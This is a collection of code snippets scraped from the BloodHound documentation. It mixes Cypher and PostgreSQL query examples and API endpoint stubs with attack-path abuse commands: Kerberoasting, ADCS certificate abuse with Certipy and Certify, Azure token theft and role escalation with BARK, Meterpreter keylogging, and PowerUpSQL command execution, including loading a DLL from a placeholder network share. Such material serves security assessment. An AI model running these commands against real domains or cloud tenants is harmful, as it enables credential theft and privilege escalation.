V;\n```\n\n----------------------------------------\n\nTITLE: Using Periodic Commit for Large CSV Imports\nDESCRIPTION: Demonstrates use of PERIODIC COMMIT hint for managing memory usage during large CSV imports. Commits transaction every 5000 rows.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_31\n\nLANGUAGE: cypher\nCODE:\n```\nUSING PERIODIC COMMIT 5000 LOAD CSV WITH HEADERS FROM 'file:///data.csv';\n```\n\n----------------------------------------\n\nTITLE: Retrieving Managed Identity JWT\nDESCRIPTION: Shows how to use BARK to retrieve a JWT token for managed identity Service Principal by making a request to the instance metadata service\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-aks-contributor.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nInvoke-AzureRMAKSRunCommand `\n    -Token $ARMToken `\n    -TargetAKSId \"/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster\" `\n    -Command \\\\'curl -i -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01\"\\\\'\n```\n\n----------------------------------------\n\nTITLE: Retrieving Kerberos Service Ticket with Get-DomainSPNTicket in PowerShell\nDESCRIPTION: This snippet uses the Get-DomainSPNTicket cmdlet from PowerView to retrieve a Kerberos service ticket for the targeted user. The resulting ticket can be used for offline cracking attempts.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-spn.mdx#2025-04-23_snippet_2\n\nLANGUAGE: powershell\nCODE:\n```\nGet-DomainSPNTicket -Credential $Cred harmj0y | fl\n```\n\n----------------------------------------\n\nTITLE: Checking Mail Attribute with LDAP Search\nDESCRIPTION: Queries LDAP to check if the victim account has the mail attribute set, which may be required for certificate enrollment based on template configuration.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"VICTIM-DN\" mail\n```\n\n----------------------------------------\n\nTITLE: SharpHound Collection for Specific Domain\nDESCRIPTION: Command to run SharpHound CE against a specific domain using the -d flag.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound.mdx#2025-04-23_snippet_5\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe -d contoso.local\n```\n\n----------------------------------------\n\nTITLE: Restoring Original dNSHostName with Certipy in Linux\nDESCRIPTION: Uses Certipy to restore the original dNSHostName of the victim computer after completing the attack to avoid disruption in the environment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_14\n\nLANGUAGE: bash\nCODE:\n```\ncertipy account update -username ATTACKER@CORP.LOCAL -password PWD -user VICTIM -dns VICTIM.CORP.LOCAL\n```\n\n----------------------------------------\n\nTITLE: Retrieving Posture Statistics with OpenAPI Endpoint\nDESCRIPTION: API endpoint specification for accessing posture statistics in BloodHound Enterprise Edition. This endpoint follows the OpenAPI standard and is available at '/api/v2/posture-stats'.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/risk-posture/get-posture-statistics.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/posture-stats\n```\n\n----------------------------------------\n\nTITLE: Promoting Service Principal to Global Administrator with PowerShell BARK\nDESCRIPTION: Uses BARK's New-AzureADRoleAssignment function to promote a Service Principal to Global Administrator using the MS Graph token with RoleManagement.ReadWrite.Directory privileges.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-grant-app-roles.mdx#2025-04-23_snippet_4\n\nLANGUAGE: powershell\nCODE:\n```\nNew-AzureADRoleAssignment `\n    -PrincipalID \"6b6f9289-fe92-4930-a331-9575e0a4c1d8\" `\n    -RoleDefinitionId \"62e90394-69f5-4237-9190-012177145e10\" `\n    -Token $MGToken\n```\n\n----------------------------------------\n\nTITLE: Establishing New PowerShell Session with Credentials\nDESCRIPTION: Creates a new PowerShell session to a target computer using previously created credentials, allowing for remote execution.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/can-ps-remote.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$session = New-PSSession -ComputerName &lt;target computer name&gt; -Credential $Cred\n```\n\n----------------------------------------\n\nTITLE: Documenting NetWkstaUserEnum Results in compstatus.csv\nDESCRIPTION: Describes the format and content of entries in compstatus.csv based on the success or failure of NetWkstaUserEnum. It includes different status codes for various error scenarios and the format for successful enumeration.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/troubleshooting.mdx#2025-04-23_snippet_2\n\nLANGUAGE: plaintext\nCODE:\n```\nTask = NetWkstaUserEnum\nStatus = ErrorAccessDenied\n\nTask = NetWkstaUserEnum\nStatus = 53\n\nTask = NetWkstaUserEnum\nStatus = Success\n```\n\n----------------------------------------\n\nTITLE: Complex Filtering Criteria Translation\nDESCRIPTION: Demonstrates translation of OpenCypher queries with complex filtering criteria including property comparisons and boolean operations.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/translate/README.md#2025-04-23_snippet_2\n\nLANGUAGE: postgresql\nCODE:\n```\nwith s0 as (select (n0.id, n0.kind_ids, n0.properties)::nodecomposite                        as n0,\n                   (e0.id, e0.start_id, e0.end_id, e0.kind_id, e0.properties)::edgecomposite as e0,\n                   (n1.id, n1.kind_ids, n1.properties)::nodecomposite                        as n1\n            from edge e0\n                     join node n0 on n0.properties ->> 'name' = '123' and n0.id = e0.start_id\n                     join node n1 on n1.kind_ids operator (pg_catalog.&&) array [1]::int2[] and n1.id = e0.end_id\n            where not (e0.properties -> 'property')::bool)\nselect s0.n0 as s, s0.e0 as r, s0.n1 as e\nfrom s0;\n```\n\n----------------------------------------\n\nTITLE: Single Node Lookup in Cypher\nDESCRIPTION: This Cypher query shows a low-cost single node lookup operation.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_11\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (p:Person) where p.name = \"Jim\" return p\n```\n\n----------------------------------------\n\nTITLE: Parameter Usage in Cypher Queries\nDESCRIPTION: Demonstrates how to use parameters in Cypher queries for dynamic value assignment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_40\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH (V)\nSET V.Name = {parameter}\n```\n\n----------------------------------------\n\nTITLE: Meterpreter Keylogging Commands\nDESCRIPTION: Commands for keylogging using Meterpreter to capture user keystrokes and monitor clipboard contents.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/has-session.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\nkeyscan_start\nkeyscan_dump\nInvoke-ClipboardMonitor\n```\n\n----------------------------------------\n\nTITLE: Requesting TGT with Certificate Using Certipy in Linux\nDESCRIPTION: Uses Certipy to authenticate to the domain using the previously generated certificate. Specifies the IP address of a domain controller to contact for authentication.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc6b.mdx#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ncertipy auth -pfx administrator.pfx -dc-ip 172.16.126.128\n```\n\n----------------------------------------\n\nTITLE: Adding New Owner to App Registration using BARK in PowerShell\nDESCRIPTION: This snippet illustrates how to use BARK's New-AppOwner function to add a new owner to an App Registration by providing the App Object ID, new owner Object ID, and the authentication token.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-add-owner.mdx#2025-04-23_snippet_2\n\nLANGUAGE: powershell\nCODE:\n```\nNew-AppOwner `\n    -AppObjectId \"52114a0d-fa5b-4ee5-9a29-2ba048d46eee\" `\n    -NewOwnerObjectId \"cea271c4-7b01-4f57-932d-99d752bbbc60\" `\n    -Token $Token\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Extended Stored Procedure DLL with PowerUpSQL\nDESCRIPTION: This command creates a custom DLL file for use as an extended stored procedure in SQL Server that will execute operating system commands when called using PowerUpSQL's Create-SQLFileXpDll function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_11\n\nLANGUAGE: powershell\nCODE:\n```\nCreate-SQLFileXpDll -Verbose -OutFile c:\\temp\\test.dll -Command \"echo test > c:\\temp\\test.txt\" -ExportName xp_test\n```\n\n----------------------------------------\n\nTITLE: Specifying Target Domain for SharpHound Collection\nDESCRIPTION: Command to direct SharpHound to collect data from a specific Active Directory domain (contoso.local).\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_1\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --Domain contoso.local\n```\n\n----------------------------------------\n\nTITLE: Setting Mail Attribute with LDAP Modify\nDESCRIPTION: Modifies the LDAP directory to set a dummy mail attribute for the victim account when required by the certificate template.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\necho -e \"dn: VICTIM-DN\\nchangetype: modify\\nreplace: mail\\nmail: test@mail.com\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Definition for Getting RDP Users for a Computer\nDESCRIPTION: This defines the OpenAPI endpoint for retrieving users that have Remote Desktop Protocol (RDP) access rights to a specific computer in BloodHound. The endpoint path includes the computer's object_id as a parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-rdp-users.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/rdp-users\n```\n\n----------------------------------------\n\nTITLE: Acquiring Azure RM Token Using Refresh Token\nDESCRIPTION: Uses BARK's Get-ARMTokenWithRefreshToken function to obtain an Azure Resource Manager scoped JWT using a refresh token.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-website-contributor.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$ARMToken = Get-ARMTokenWithRefreshToken `\n    -RefreshToken \"0.ARwA6WgJJ9X2qk...\" `\n    -TenantID \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: Accessing Azure Key Vault Content with PowerZure\nDESCRIPTION: PowerZure commands to fetch and export certificates from Azure Key Vaults. These commands can be used when a user has the AZGetKeys privilege to extract sensitive key material.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-get-keys.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\nGet-AzureKeyVaultContent\nExport-AzureKeyVaultcontent\n```\n\n----------------------------------------\n\nTITLE: Configuring Cache File Name in SharpHound\nDESCRIPTION: Specifies a custom name for SharpHound's cache file which stores principal names to SIDs and IPs to computer names mappings. This example sets the cache file name to 'Accounting.bin'.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_13\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --CacheName Accounting.bin\n```\n\n----------------------------------------\n\nTITLE: Retrieving MFA Activation Status for BloodHound User\nDESCRIPTION: API endpoint for getting the MFA activation status of a specific BloodHound user by their user ID. This endpoint follows the OpenAPI specification and is accessible in both enterprise and community editions.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/bloodhound-users/returns-mfa-activation-status-for-a-user.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/bloodhound-users/{user_id}/mfa-activation\n```\n\n----------------------------------------\n\nTITLE: Path Results Binding Query in PostgreSQL\nDESCRIPTION: Query that binds expanded paths to node and edge composites, creating the final result structure.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/translate/README.md#2025-04-23_snippet_7\n\nLANGUAGE: postgresql\nCODE:\n```\nselect (n0.id, n0.kind_ids, n0.properties)::nodecomposite as n0,\n       (select array_agg((e0.id, e0.start_id, e0.end_id, e0.kind_id, e0.properties)::edgecomposite)\n        from edge e0\n        where e0.id = any (ex0.path))                     as e0,\n       ex0.path                                           as ep0,\n       (n1.id, n1.kind_ids, n1.properties)::nodecomposite as n1\nfrom ex0\n         join edge e0 on e0.id = any (ex0.path)\n         join node n0 on n0.id = ex0.root_id\n         join node n1 on e0.id = ex0.path[array_length(ex0.path, 1)::int4] and n1.id = e0.end_id\n```\n\n----------------------------------------\n\nTITLE: Filtering All Nodes in a Matched Pattern in Cypher\nDESCRIPTION: This Cypher query uses a quantifier expression to filter all nodes in a matched pattern, which adds additional weight to the query's cost in the analyzer's model.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_7\n\nLANGUAGE: cypher\nCODE:\n```\nmatch p = (:Person)-[:WorksFor]->(:Company) where none(n in nodes(p) where n.excluded) return p\n```\n\n----------------------------------------\n\nTITLE: Executing OS Commands via CLR Integration in SQL Server with PowerUpSQL\nDESCRIPTION: This command executes operating system commands through SQL Server using CLR integration via PowerUpSQL's Invoke-SQLOSCLR function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_10\n\nLANGUAGE: powershell\nCODE:\n```\nInvoke-SQLOSCLR -Verbose -Command \"Whoami\" -Instance sqlserver\\instance\n```\n\n----------------------------------------\n\nTITLE: Requesting Enrollment Agent Certificate (Windows)\nDESCRIPTION: Use Certify to request an enrollment agent certificate from the specified CA and template.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc3.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nCertify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent\n```\n\n----------------------------------------\n\nTITLE: Querying Nodes with Name Property and Parameter Matching in PostgreSQL\nDESCRIPTION: This snippet illustrates a more complex PostgreSQL query that filters nodes based on a 'name' property. It also demonstrates parameter matching between Cypher and PostgreSQL queries, using JSON objects to specify the parameters.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/test/translation_cases/README.md#2025-04-23_snippet_2\n\nLANGUAGE: postgresql\nCODE:\n```\nwith s0 as (select (n0.id, n0.kind_ids, n0.properties)::nodecomposite as n0\n            from node n0\n            where n0.properties ->> 'name' = @pi0::text)\nselect s0.n0 as s\nfrom s0;\n```\n\n----------------------------------------\n\nTITLE: Finding Group Members with Cypher in BloodHound\nDESCRIPTION: The first part of the advanced query that finds all users who are members of a specific group, including through nested group memberships. This query returns the shortest paths from users to the specified group.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/analyze-data/bloodhound-gui/cypher-search.mdx#2025-04-23_snippet_5\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH p=shortestPath((m:User)-[r:MemberOf*1..]->(n:Group))WHERE n.name = \"$name_of_group\"\n```\n\n----------------------------------------\n\nTITLE: Setting Victim Mail Attribute\nDESCRIPTION: Sets a dummy mail attribute for the victim account using PowerView when required by the certificate template\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint - Computer Constrained Users\nDESCRIPTION: OpenAPI specification for GET endpoint to fetch users constrained by a specific computer object ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-constrained-users.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/constrained-users\n```\n\n----------------------------------------\n\nTITLE: Acquiring Tokens as the Service Principal in Azure\nDESCRIPTION: This snippet demonstrates how to use BARK's Get-MSGraphToken function with the newly created secret to acquire tokens as the service principal. This allows for further exploitation of the service principal's privileges.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-add-secret.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nPS /Users/andyrobbins> $SPToken = Get-MSGraphToken `\n-ClientID \"4d31...\" `\n-ClientSecret \"odg8Q~...\" `\n-TenantName \"contoso.onmicrosoft.com\"\nPS /Users/andyrobbins> $SPToken.access_token\neyJ0eXAiOiJKV1QiLCJub...\n```\n\n----------------------------------------\n\nTITLE: Adding a Custom Extended Stored Procedure to SQL Server with PowerUpSQL\nDESCRIPTION: This command adds a custom extended stored procedure to a SQL Server instance by loading a DLL from a network share using PowerUpSQL's Get-SQLQuery function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_12\n\nLANGUAGE: powershell\nCODE:\n```\nGet-SQLQuery -Verbose -Query \"sp\\_addextendedproc 'xp\\_test', '\\\\\\yourserver\\\\yourshare\\\\myxp.dll'\" -Instance sqlserver\\instance\n```\n\n----------------------------------------\n\nTITLE: Saving Custom Cypher Queries in BloodHound Enterprise\nDESCRIPTION: BloodHound Enterprise now allows users to save custom Cypher queries. Users can write a query and click the \"Save Query\" button to name and store it for future use. This feature enhances the flexibility and usability of BloodHound for custom analysis tasks.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/release-notes/2023-11-06-v5-2-0.mdx#2025-04-23_snippet_0\n\nLANGUAGE: cypher\nCODE:\n```\n// Example of how to write and save a custom Cypher query\n// (Actual query code not provided in the release notes)\n```\n\n----------------------------------------\n\nTITLE: Finding MS Graph Service Principal ID in Azure AD\nDESCRIPTION: Filters the list of Service Principals to find the MS Graph Service Principal by its universal ID (00000003-0000-0000-c000-000000000000) and selects its object ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-grant-app-roles.mdx#2025-04-23_snippet_2\n\nLANGUAGE: powershell\nCODE:\n```\n$SPs | ?{$_.appId -Like \"00000003-0000-0000-c000-000000000000\"} | Select id\n```\n\n----------------------------------------\n\nTITLE: Multiple Node Lookup Without Labels in Cypher\nDESCRIPTION: This Cypher query shows the highest-cost scenario for multiple node lookups without labels.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_13\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (p1), (p2) where p1.name = \"Jim\" and p2.name = \"Evil Jim\" return p1, p2\n```\n\n----------------------------------------\n\nTITLE: Removing a Custom Extended Stored Procedure from SQL Server with PowerUpSQL\nDESCRIPTION: This command removes a previously added custom extended stored procedure from SQL Server using PowerUpSQL's Get-SQLQuery function with the sp_dropextendedproc system stored procedure.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_14\n\nLANGUAGE: powershell\nCODE:\n```\nGet-SQLQuery -Verbose -Query \"sp\\_dropextendedproc 'xp\\_test'\" -Instance sqlserver\\instance\n```\n\n----------------------------------------\n\nTITLE: Enrolling Certificate Using Certify on Windows\nDESCRIPTION: Uses Certify.exe to request a certificate from an enterprise CA using a specified template. Requires proper CA name and template name to be specified.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/enroll.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nCertify.exe request /ca:SERVER\\\\CA-NAME /template:TEMPLATE\n```\n\n----------------------------------------\n\nTITLE: Complete Pattern Expansion Translation in PostgreSQL\nDESCRIPTION: Complete translation of the openCypher query 'match (n)-[*..]->(e) return n, e' into PostgreSQL, combining all components into a single query.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/translate/README.md#2025-04-23_snippet_8\n\nLANGUAGE: postgresql\nCODE:\n```\n-- match (n)-[*..]->(e) return n, e\nwith s0 as (with recursive ex0(root_id, next_id, depth, satisfied, is_cycle, path) as (select e0.start_id,\n                                                                                              e0.end_id,\n                                                                                              1,\n                                                                                              false,\n                                                                                              e0.start_id = e0.end_id,\n                                                                                              array [e0.id]\n                                                                                       from edge e0\n                                                                                                join node n0 on n0.id = e0.start_id\n                                                                                                join node n1 on n1.id = e0.end_id\n                                                                                       union\n                                                                                       select ex0.root_id,\n                                                                                              e0.end_id,\n                                                                                              ex0.depth + 1,\n                                                                                              false,\n                                                                                              e0.id = any (ex0.path),\n                                                                                              ex0.path || e0.id\n                                                                                       from ex0\n                                                                                                join edge e0 on e0.start_id = ex0.next_id\n                                                                                                join node n1 on n1.id = e0.end_id\n                                                                                       where ex0.depth < 5\n                                                                                         and not ex0.is_cycle)\n            select (n0.id, n0.kind_ids, n0.properties)::nodecomposite as n0,\n                   (select array_agg((e0.id, e0.start_id, e0.end_id, e0.kind_id, e0.properties)::edgecomposite)\n                    from edge e0\n                    where e0.id = any (ex0.path))                     as e0,\n                   ex0.path                                           as ep0,\n                   (n1.id, n1.kind_ids, n1.properties)::nodecomposite as n1\n            from ex0\n                     join edge e0 on e0.id = any (ex0.path)\n                     join node n0 on n0.id = ex0.root_id\n                     join node n1 on e0.id = ex0.path[array_length(ex0.path, 1)::int4] and n1.id = e0.end_id)\nselect s0.n0 as n, s0.n1 as e\nfrom s0;\n```\n\n----------------------------------------\n\nTITLE: Querying SQL Server Audit Status for OpSec Assessment\nDESCRIPTION: This SQL query retrieves information about the current audit configuration status in SQL Server to help attackers understand what actions might be logged during an attack.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_15\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM sys.dm\\_server\\_audit_status\n```\n\n----------------------------------------\n\nTITLE: Collecting Groups with Username/Password in AzureHound (JSON)\nDESCRIPTION: This command authenticates with a username and password to list all groups in a specified tenant using AzureHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/azurehound.mdx#2025-04-23_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n./azurehound -u \"MattNelson@contoso.onmicrosoft.com\" -p \"MyVeryStrongPassword\" list groups --tenant \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: Fetching All Objects GUID in PowerView\nDESCRIPTION: Retrieves the GUID map for all objects in the domain and extracts the GUID for 'All' objects type.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/contains.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$Guids = Get-DomainGUIDMap\n$AllObjectsPropertyGuid = $Guids.GetEnumerator() | ?{$_.value -eq 'All'} | select -ExpandProperty name\n```\n\n----------------------------------------\n\nTITLE: Defining GET API Endpoint for Group Controllers in YAML\nDESCRIPTION: OpenAPI specification for the endpoint that retrieves controllers of a specific group identified by object_id. The endpoint path follows RESTful conventions for resource access.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/groups/get-group-entity-controllers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/groups/{object_id}/controllers\n```\n\n----------------------------------------\n\nTITLE: Extracting JWT Tokens from Automation Account Managed Identities\nDESCRIPTION: This example demonstrates how to retrieve a JWT for a managed identity service principal by creating a runbook that accesses the managed identity endpoint from within the Automation Account.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-automation-contributor.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n$Script = $tokenAuthURI = $env:MSI_ENDPOINT + \"?resource=https://graph.microsoft.com/&api-version=2017-09-01\"; $tokenResponse = Invoke-RestMethod -Method Get -Headers @{\"Secret\"=\"$env:MSI_SECRET\"} -Uri $tokenAuthURI; $tokenResponse.access_token\nNew-AzureAutomationAccountRunBook -Token $ARMToken -RunBookName \"MyCoolRunBook\" -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\" -Script $Script\nGet-AzureAutomationAccountRunBookOutput -Token $ARMToken -RunBookName \"MyCoolRunBook\" -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\"\n```\n\n----------------------------------------\n\nTITLE: Executing Commands on AKS Cluster\nDESCRIPTION: Demonstrates using BARK's Invoke-AzureRMAKSRunCommand to execute a 'whoami' command on the target AKS cluster using an ARM token\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-aks-contributor.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nInvoke-AzureRMAKSRunCommand `\n    -Token $ARMToken `\n    -TargetAKSId \"/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster\" `\n    -Command \"whoami\"\n```\n\n----------------------------------------\n\nTITLE: Counting Active Sessions with Cypher in BloodHound\nDESCRIPTION: The second part of the advanced query that finds and counts computers where users from the previous query have active sessions. This demonstrates using the result of one query as input for another query.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/analyze-data/bloodhound-gui/cypher-search.mdx#2025-04-23_snippet_6\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH q=((m)<-[:HasSession]-(o:Computer))RETURN count(o)\n```\n\n----------------------------------------\n\nTITLE: GET Domain Foreign Users API Endpoint\nDESCRIPTION: OpenAPI specification for retrieving foreign users from a specified domain. The endpoint requires a domain object ID parameter and returns foreign user data.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-foreign-users.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/foreign-users\n```\n\n----------------------------------------\n\nTITLE: Checking Certificate Template Authentication Settings in PowerShell\nDESCRIPTION: This PowerShell snippet checks the authentication settings of a certificate template.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_9\n\nLANGUAGE: powershell\nCODE:\n```\n$templateName = \"TemplateName\" # Use CN, not display name\n\n# Find the certificate template\n$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")\n$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"\n$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)\n$searcher = New-Object DirectoryServices.DirectorySearcher\n$searcher.SearchRoot = $ldap\n$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"\n$template = $searcher.FindOne().GetDirectoryEntry()\n\n# Print attributes\nWrite-Host \"pKIExtendedKeyUsage: $($template.Properties[\"pKIExtendedKeyUsage\"])\"\nWrite-Host \"msPKI-Certificate-Application-Policy: $($template.Pro\n```\n\n----------------------------------------\n\nTITLE: Bidirectional Single Depth Pattern Lookup in Cypher\nDESCRIPTION: This Cypher query shows a higher-cost bidirectional single depth pattern lookup.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_15\n\nLANGUAGE: cypher\nCODE:\n```\nmatch p1 = (p2:Person)<-[:WorksFor]->(:Company) where p2.name = \"Jim\" return p1\n```\n\n----------------------------------------\n\nTITLE: SharpHound Session Loop Collection\nDESCRIPTION: Command to run SharpHound's session collection method in a loop for gathering user session data over time. Default loop duration is 2 hours.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound.mdx#2025-04-23_snippet_1\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --CollectionMethods Session --Loop\n```\n\n----------------------------------------\n\nTITLE: Retrieving Azure Automation Runbook Execution Output\nDESCRIPTION: This code shows how to execute a runbook and fetch its output using the Get-AzureAutomationAccountRunBookOutput function from BARK.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-automation-contributor.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nGet-AzureAutomationAccountRunBookOutput `\n    -Token $ARMToken `\n    -RunBookName \"MyCoolRunBook\" `\n    -AutomationAccountPath \"https://management.azure.com/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourceGroups/AutomationAccts/providers/Microsoft.Automation/automationAccounts/MyCoolAutomationAccount\"\n```\n\n----------------------------------------\n\nTITLE: Node Lookup with Label in Cypher\nDESCRIPTION: This Cypher query shows a lower cost node lookup with a label. The analyzer assigns lower cost to queries that bind node lookups to labels.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_3\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (n:Label1) return n;\n```\n\n----------------------------------------\n\nTITLE: Running AzureHound Enterprise Once on Windows\nDESCRIPTION: Executes AzureHound Enterprise for a single run on Windows using the command line.\nSOURCE: 